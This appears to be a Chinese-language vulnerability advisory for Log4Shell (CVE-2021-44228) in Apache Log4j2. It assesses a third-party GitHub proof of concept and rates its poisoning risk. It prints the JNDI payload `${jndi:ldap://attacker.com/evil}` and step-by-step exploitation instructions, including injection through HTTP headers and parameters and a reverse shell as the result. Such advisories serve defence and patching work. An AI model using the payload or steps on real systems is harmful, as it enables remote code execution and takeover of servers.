## CVE-2021-44228-Log4Shell-RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可导致服务器完全控制

**影响版本:** <= 2.14.1 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用存在漏洞的Log4j2版本，且允许攻击者控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的远程代码执行漏洞，存在于Apache Log4j2中。攻击者可以通过构造特殊的JNDI注入字符串，例如`${jndi:ldap://attacker.com/evil}`，当Log4j2记录此字符串时，会尝试通过JNDI从攻击者控制的LDAP服务器下载并执行恶意代码。这个漏洞利用的关键在于Log4j2的lookup substitution功能允许在日志消息中使用JNDI查找。漏洞库信息、搜索引擎结果和提供的PoC代码都证实了此漏洞的严重性和利用方式。

**有效性：**
提供的YAML格式的PoC代码有效，针对不同的应用场景（Apache Druid, Apache JSPWiki, CAS, Code42, Elasticsearch等）构造了特定的payload，通过发送包含JNDI注入字符串的请求，触发漏洞。

**投毒风险：**
PoC代码本身的主要目的是验证漏洞的存在，但存在一定的投毒风险。虽然PoC中执行的恶意代码通常是用于验证目的，例如回连攻击者的服务器，但如果攻击者篡改这些PoC，可以将payload替换为更具破坏性的恶意代码，比如植入后门、窃取敏感信息或进行拒绝服务攻击。由于PoC文件来自未经审核的第三方源，存在作者在payload中植入恶意代码的可能性。因此，在使用这些PoC时，需要仔细审查代码，确保其安全性。

风险评估：
* 代码结构和目标：PoC文件结构清晰，目标明确，针对已知漏洞利用。恶意行为的风险较低，因为代码的目的是为了复现漏洞，而不是隐藏恶意功能。
* 外部依赖：几乎没有外部依赖项，降低了引入恶意代码的可能性。
* 权限要求：这些 PoC 需要具有执行网络请求的权限，这增加了潜在的风险，因为它们可能被用来发起对内部网络的攻击或数据泄露。
* 代码审查：代码可读性高，易于审查。这意味着可以相对容易地识别和删除任何潜在的恶意代码。

综合以上因素，我给出的投毒风险是 10%。

**利用方式：**
1.  **确定目标系统：** 找到使用存在漏洞的Log4j2版本的应用程序。
2.  **构造恶意Payload：**  构建包含JNDI注入的Payload，例如`${jndi:ldap://attacker.com/evil}`。其中`attacker.com`是攻击者控制的服务器，`evil`是LDAP服务器上的恶意代码。
3.  **发送Payload：** 将Payload插入到应用程序的日志消息中。这可以通过多种方式实现，例如：
    *   HTTP请求头（User-Agent, X-Forwarded-For等）
    *   POST请求参数
    *   URL参数
    *   任何可能被应用程序记录的输入
4.  **利用JNDI执行恶意代码：**  当Log4j2记录包含Payload的消息时，会尝试通过JNDI从`attacker.com`下载并执行恶意代码。
5.  **反向shell获取权限：**  恶意代码通常会启动一个反向shell，允许攻击者远程控制目标系统。

提供的PoC代码针对特定应用（Druid, JSPWiki, CAS, Code42, Elasticsearch）的特定URI或HTTP头构造包含恶意JNDI字符串的请求，如果目标应用存在漏洞，且使用Log4j2记录相关请求信息，则可触发漏洞，实现远程代码执行。

**项目地址:** [sec13b/CVE-2021-44228-POC](https://github.com/sec13b/CVE-2021-44228-POC)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)